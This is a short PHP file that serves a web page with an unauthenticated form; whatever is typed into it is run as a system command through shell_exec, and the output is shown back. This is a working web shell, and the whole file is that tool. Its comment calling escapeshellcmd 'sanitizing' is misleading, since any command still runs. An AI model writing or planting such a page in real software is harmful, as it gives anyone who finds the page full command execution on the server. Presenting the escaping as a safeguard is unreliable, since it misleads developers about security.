<?php
if(isset($_POST['cmd'])){ // If the form is submitted
    $cmd = escapeshellcmd($_POST['cmd']); // Sanitize the command
    $output = shell_exec($cmd); // Execute the command
}
?>

<form method="POST">
    <input type="text" name="cmd" placeholder="Enter command" autofocus>
    <input type="submit" value="Execute">
</form>

<?php
if (isset($output)) { // If the command was executed
    echo "<div class='output'>" . htmlentities($output) . "</div>"; // Display the output
} 
?>

